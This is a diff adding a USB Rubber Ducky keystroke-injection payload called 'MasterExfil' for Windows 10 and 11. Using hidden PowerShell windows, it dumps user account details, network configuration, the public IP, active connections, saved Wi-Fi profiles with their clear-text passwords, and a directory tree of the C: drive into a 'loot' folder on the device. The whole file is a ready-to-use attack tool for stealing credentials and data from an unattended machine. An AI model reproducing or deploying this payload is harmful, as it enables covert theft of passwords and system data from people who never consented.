@@ -1,0 +1,58 @@
+REM author: Girliznone
+REM title: MasterExfil
+REM Description: This payload is master exfil Capable to exfil allot of data of 1 machine during 1:30 minute you will need to open new folder on the root folder of DUCKY called "loot" in order for saving all the data
+REM OS: Windows (Tested on 10, 11)
+REM Notes: Please do open new folder named "loot" in theroot directory of DUCKY
+
+ATTACKMODE HID STORAGE
+DELAY 500
+GUI r
+DELAY 200
+STRING powershell -WindowStyle hidden "$m=(Get-Volume -FileSystemLabel 'DUCKY').DriveLetter + ':\loot'; cd $m; net user $env:USERNAME > $m\UserData.txt"
+ENTER
+DELAY 5000
+GUI r 
+DELAY 200
+STRING powershell -WindowStyle hidden "$m=(Get-Volume -FileSystemLabel 'DUCKY').DriveLetter + ':\loot'; cd $m; ipconfig /all > $m\IpData.txt"
+ENTER
+DELAY 5000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle hidden "$m=(Get-Volume -FileSystemLabel 'DUCKY').DriveLetter + ':\loot'; cd $m; nslookup myip.opendns.com resolver1.opendns.com > $m\Nslookup.txt"
+ENTER
+DELAY 5000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle hidden "$m=(Get-Volume -FileSystemLabel 'DUCKY').DriveLetter + ':\loot'; cd $m; netsh wlan show profiles | findstr "All" > $m\Profiles.txt"
+ENTER
+DELAY 5000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle hidden "$m=(Get-Volume -FileSystemLabel 'DUCKY').DriveLetter + ':\loot'; cd $m; netstat -aon > $m\NetStat.txt"
+ENTER
+DELAY 5000
+GUI r
+DELAY 200
+STRING powershell 
+ENTER
+DELAY 200
+STRING powershell 
+ENTER
+DELAY 200
+STRING $m=(Get-Volume -FileSystemLabel 'DUCKY').DriveLetter + ':\loot'; cd $m; (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize > $m\WifiPasswords.txt
+ENTER
+DELAY 10000
+STRING exit
+ENTER
+DELAY 200
+GUI r
+DELAY 200
+STRING powershell -WindowStyle hidden "$m=(Get-Volume -FileSystemLabel 'DUCKY').DriveLetter + ':\loot'; cd $m; tree C:\ > $m\TreeOfC.txt"
+ENTER
+DELAY 50000
+GUI r
+DELAY 200
+STRING notepad.exe
+ENTER
+DELAY 400
+STRING done !
